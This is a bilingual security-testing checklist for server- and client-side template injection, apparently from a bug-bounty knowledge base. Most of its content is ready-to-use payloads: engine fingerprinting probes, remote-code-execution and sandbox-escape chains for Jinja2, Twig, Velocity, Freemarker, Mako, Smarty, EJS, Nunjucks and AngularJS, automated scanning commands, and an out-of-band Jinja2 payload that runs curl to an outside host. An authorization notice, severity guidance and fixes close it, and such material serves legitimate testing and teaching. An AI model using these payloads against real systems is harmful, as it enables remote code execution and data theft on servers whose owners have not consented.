---
id: clk-ssti-template-injection
title: SSTI / Template Injection
owasp_anchor: [WSTG-INPV, A03:2021]
cwe: [CWE-1336, CWE-94]
severity_typical: P1-P2
playbook: playbooks/ssti.yaml
last_updated: 2026-05-14
sources: []
maturity: stable
---

# SSTI / Template Injection Checklist

> 双语 / Bilingual: 服务端 / 客户端模板注入攻击面合一。
> 用法：先做"Recon & 渲染指纹"识别引擎，再按对应引擎的 sandbox 逃逸路径推进。
> Authorization-only：能弹 RCE 之前先用纯算术 / 字符串拼接探活；危险沙箱逃逸只在自有租户复现。

---

## 1. Recon & 渲染指纹

- [ ] 列出渲染入口：用户名、签名、邮件模板、PDF 报表、欢迎邮件、规则引擎、报表自定义字段、错误页 / 404 模板、富文本邮件、Slack/Discord webhook
- [ ] 用区分 payload 探引擎：
  - `${7*7}` / `{{7*7}}` / `<%= 7*7 %>` / `#{7*7}` / `[[ 7*7 ]]` / `*{7*7}` / `@(7*7)`
  - 渲染为 49 / 7777777 / 原样 / 错误信息中泄露引擎
- [ ] 区分服务端 SSTI vs 客户端（AngularJS / Vue / Handlebars 客户端运行）
- [ ] rendering chain：用户输入 → 邮件 subject → 模板 → 转 PDF → 转图（链式 SSTI 常出现在第二跳）
- [ ] 是否在 sandbox（Jinja2 SandboxedEnvironment、Twig sandbox、Velocity SecureUberspector、Freemarker `?api`）

## 2. Jinja2 (Python)

- [ ] 算术探活：`{{7*7}}` → 49；`{{7*'7'}}` → `'7777777'`
- [ ] 类层级遍历：`{{''.__class__.__mro__[1].__subclasses__()}}` → 找 `subprocess.Popen`
- [ ] 经典 RCE：`{{ ''.__class__.__mro__[1].__subclasses__()[XXX]('id', shell=True, stdout=-1).communicate() }}`
- [ ] config 泄露：`{{ config }}` / `{{ config.items() }}`
- [ ] 全局对象：`{{ url_for.__globals__ }}`、`{{ request }}`、`{{ get_flashed_messages.__globals__ }}`
- [ ] SandboxedEnvironment 绕过：`|attr('__class__')` 链、`{% raw %}` / `{% set %}` 利用

## 3. Twig (PHP / Symfony)

- [ ] `{{ 7*7 }}` → 49
- [ ] `{{ _self.env.registerUndefinedFilterCallback("system") }}{{ _self.env.getFilter("id") }}`（旧版）
- [ ] sandbox 绕过：`{{['id']|filter('system')}}`、`{{ {0:_self}|map('system') }}`
- [ ] Symfony specific：`{{ app.request.server.get('SCRIPT_FILENAME') }}` 信息泄露
- [ ] Drupal Twig（[example: SA-CORE-2018-002 类]）

## 4. Velocity / Freemarker / Pebble (Java)

- [ ] Velocity：`#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("exec",...)`
- [ ] Velocity SecureUberspector 绕过：`$class.inspect("java.lang.Runtime").type.getRuntime().exec(...)`
- [ ] Freemarker：`<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}`
- [ ] Freemarker `?api` / `?eval` 启用：`${"id"?eval}` / `${object?api.class.name}`
- [ ] Pebble：`{{'test'.getClass().forName('Runtime')...}}`、新版 `{% raw %}` 与 `attribute()` 绕过
- [ ] Confluence / Jira / Liferay 经常默认带 Velocity / Freemarker

## 5. Mako / Smarty (Python / PHP)

- [ ] Mako：`<%! import os %>${os.popen('id').read()}`、`<%import os; %>`
- [ ] Smarty：`{php}system('id');{/php}`（旧版）、`{Smarty_Internal_Write_File::writeFile($s, 'shell', $smarty)}`、`{system('id')}`
- [ ] Smarty 3 sandbox：`{function name=x}` / `{$smarty.template_object->...}`

## 6. Handlebars / Liquid / EJS / Nunjucks / Mustache (Node.js)

- [ ] Handlebars 默认无表达式语言，但 `lookup` / 自定义 helper / SafeString → XSS+SSTI
- [ ] Handlebars RCE：`{{#with "s" as |string|}}{{#with split as |conslist|}}...{{/with}}{{/with}}`（[example: 历史 helper escape 类]）
- [ ] Liquid（Shopify / Jekyll）：默认 sandbox，注入 `{{ assign x=settings }}`、`{{ shop.metafields }}`
- [ ] EJS：`<%= process.mainModule.require('child_process').execSync('id') %>`
- [ ] EJS opts.client / opts.escape 注入（[example: EJS prototype pollution → RCE 类]）
- [ ] Nunjucks：`{{ range.constructor("return process")().mainModule.require('child_process').execSync('id') }}`
- [ ] Mustache：默认 logic-less，sink 在自定义 lambdas

## 7. 客户端 SSTI / Sandbox 逃逸

- [ ] AngularJS（1.x）`{{constructor.constructor('alert(1)')()}}`，CSP bypass with sandbox escape（1.6 后移除 sandbox）
- [ ] Vue 2 模板：`{{ this.constructor.constructor('alert(1)')() }}`（仅当 v-html 渲染用户输入时）
- [ ] Lit / Svelte：模板编译期处理，关注开发者把用户输入塞进 `unsafeHTML`
- [ ] React `dangerouslySetInnerHTML` 不是 SSTI，但配合 server render 形成模板注入

## 8. Email / PDF / Report Template Injection

- [ ] 邮件 subject 渲染（{{ user.firstName }}）→ 注入 `{{7*7}}` 触发引擎
- [ ] 服务端 PDF（wkhtmltopdf / weasyprint / Puppeteer）渲染 HTML 模板：注入 SSRF / file:// / SVG XSS
- [ ] LibreOffice headless 转换 .docx / .xlsx 时的 DDE 公式 + 模板字段
- [ ] 报表 builder / 规则引擎（Jaspersoft / BIRT / Crystal Reports）支持脚本表达式 → 触发 Groovy / JS 执行
- [ ] webhook formatter（Slack / Discord / Teams）允许 markdown / mention 注入

## 9. 自动化辅助

```bash
# tplmap（多引擎 SSTI 自动化）
python3 tplmap.py -u 'https://target/page?name=*'

# 探活 fuzz：用 ffuf 跑 SSTI wordlist
ffuf -w wordlists/ssti.txt -u 'https://target/api/render?tpl=FUZZ' -mr '49|7777777'

# Burp Bambda（响应中含 49 且请求含 ${7*7}）
# return requestResponse.request().contains("\${7*7}") &&
#        requestResponse.response().bodyToString().contains("49");

# Nuclei SSTI 模板
nuclei -tags ssti,jinja,twig,freemarker,velocity,handlebars,ejs -u https://target

# Caido Workflow: ssti-detect.yml
# - replace param value with $$ssti_payload$$ from list
# - assert response contains expected eval result

# 一句 Python 跑 Jinja2 探活
python3 - <<'EOF'
import requests
for p in ["{{7*7}}", "${7*7}", "<%=7*7%>", "#{7*7}", "{{'7'*7}}"]:
    r = requests.get("https://target/render", params={"tpl": p})
    if "49" in r.text or "7777777" in r.text:
        print("HIT", p)
EOF

# OOB 探活（不直接 RCE，先 DNS）
{{ ''.__class__.__mro__[1].__subclasses__()[XXX]('curl http://oast.live/jinja', shell=True) }}
```

## 10. Reporting Angle

* **Title 模板**：`<engine> SSTI in <field/endpoint> allows <impact> via <render path>`
  例：`Jinja2 SSTI in welcome email subject leads to RCE via SandboxedEnvironment escape`
* **Severity 自评**：
  * 未授权 RCE → CVSS 3.1 9.0-9.8 / VRT P1
  * 认证后 RCE → CVSS 7.5-8.5 / VRT P1
  * SSRF / file 读取（无 RCE）→ CVSS 6.0-7.5 / VRT P2
  * 仅信息泄露（config dump、env vars）→ CVSS 5.0-6.0 / VRT P2-P3
  * 客户端 SSTI / DOM-only → CVSS 4.0-6.0 / VRT P3
* **CWE 推荐**：CWE-1336（模板注入）；触达执行追加 CWE-94 或 CWE-78；客户端 SSTI 追加 CWE-79
* **PoC 必须**：先 `${7*7}` / `{{7*7}}` 探活截图，再 OOB DNS 触发证据；命令执行只跑 `id` / `whoami`
* **Suggested Fix**（至少 2 条）：
  * 用户可控字符串绝不直接进入模板 source；改用参数化（`render_template('x.html', name=name)`）
  * 启用 sandbox（Jinja2 `SandboxedEnvironment`、Twig `SandboxExtension` 白名单、Freemarker 关闭 `?api`/`?new`）
  * 模板渲染服务最小权限运行；输出转义；下游链路（PDF / 邮件）二次校验

## 11. 已迁移技法（来自 KB）

- [[techniques/jinja2_sandbox_escape|Jinja2 SandboxedEnvironment 逃逸链]]
- [[techniques/twig_self_env|Twig _self.env 注册 filter 链]]
- [[techniques/freemarker_new_exec|Freemarker `?new` Execute 链]]
- [[techniques/email_subject_ssti|邮件主题模板二次渲染 SSTI]]
- [[techniques/angular_sandbox_legacy|AngularJS 1.x sandbox escape]]
